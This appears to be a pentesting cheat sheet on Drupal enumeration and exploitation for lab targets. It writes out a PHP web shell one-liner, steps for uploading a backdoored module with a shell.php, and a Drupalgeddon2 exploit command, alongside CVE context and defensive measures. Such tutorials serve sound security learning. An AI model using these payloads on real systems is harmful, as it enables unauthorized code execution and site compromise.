

# Drupal - Enumeration & Exploitation

## 🧠 Overview

Drupal is a powerful, enterprise-grade open-source CMS. While secure when patched, its complexity often leads to misconfigurations or the delayed patching of critical vulnerabilities like SQLi and RCE.

---

## 🔍 Footprinting & Enumeration

### 🧪 Manual Identification

Drupal leaves several "fingerprints" that are easy to spot:

* **Headers:** `X-Generator: Drupal 7 (http://drupal.org)`
* **Nodes:** Look for paths like `/node/1`, `/node/add`.
* **Robots.txt:** Often contains entries for `/includes/`, `/profiles/`, `/scripts/`.

### 🧪 Automated Scanning

**Droopescan** is the specialized tool for this task. It identifies versions, themes, and plugins.

```bash
# Installation
pip3 install droopescan

# Scanning
droopescan scan drupal -u http://target.htb

```

---

## 💥 Authenticated Exploitation (Admin Access)

If you obtain admin credentials (via password reuse, brute force, or SQLi), Drupal provides two main paths to a shell:

### 1. PHP Filter Module (The "Old School" Path)

In Drupal 7 and earlier, the **PHP Filter** module allowed users to write PHP directly into the body of a page.

1. **Enable:** Go to `Modules` -> Check `PHP Filter` -> `Save`.
2. **Create Content:** Add a new `Basic Page`.
3. **Inject:** Set `Text Format` to `PHP Code` and paste:
```php
<?php system($_GET['cmd']); ?>

```


4. **Trigger:** Access the node (e.g., `/node/1?cmd=id`).

### 2. Malicious Module Upload

Modern Drupal (8/9/10) requires uploading a backdoored module.

1. **Download** a simple module (like `captcha`).
2. **Backdoor:** Add a `shell.php` and an `.htaccess` (to bypass access restrictions) into the module folder.
3. **Compress:** `tar -cvzf backdoored_captcha.tar.gz captcha/`
4. **Install:** `Manage` -> `Extend` -> `Install new module`.
5. **Execute:** `http://target.htb/modules/captcha/shell.php?cmd=id`

---

## 🔥 Pre-Authenticated Exploitation (The "Drupalgeddon" Saga)

These are the "Holy Grail" of Drupal exploits because they do **not** require credentials.

| Exploit | CVE | Vulnerability | Impact |
| --- | --- | --- | --- |
| **Drupalgeddon** | CVE-2014-3704 | SQL Injection | Admin creation / RCE |
| **Drupalgeddon2** | CVE-2018-7600 | Improper Input Validation | **Unauthenticated RCE** |
| **Drupalgeddon3** | CVE-2018-7602 | Insecure Parameter Handling | **Authenticated RCE** |

### 🚀 Exploiting Drupalgeddon2 (CVE-2018-7600)

This is one of the most critical bugs in Drupal's history. It targets the `Form API` and allows RCE by injecting malicious arrays.

```bash
# Example using a common exploit script
python3 drupalgeddon2.py http://target.htb -c "id"

```

---

## 🛡️ Defensive Measures

1. **Update Core:** Drupal releases security advisories (SA-CORE) regularly. Patching is the only real fix for Drupalgeddon.
2. **The "Checklist":** Remove `CHANGELOG.txt`, `README.txt`, and `INSTALL.txt` from the web root.
3. **Permissions:** Ensure the `web.config` or `.htaccess` blocks access to sensitive directories like `/includes` or `/vendor`.
4. **Disable PHP Filter:** Never enable the PHP filter module in a production environment.

---

## 💣 Pentester Mindset

* **Check Versioning:** Use `CHANGELOG.txt` if available; it's the fastest way to find if a Drupalgeddon exploit will work.
* **Nodes as Recon:** Enumerate nodes (`/node/1`, `/node/2`) to find hidden internal documentation or user-submitted sensitive info.
* **Look for Extensions:** Drupal's power comes from modules. A secure Drupal Core can still be compromised via a vulnerable 3rd-party module.

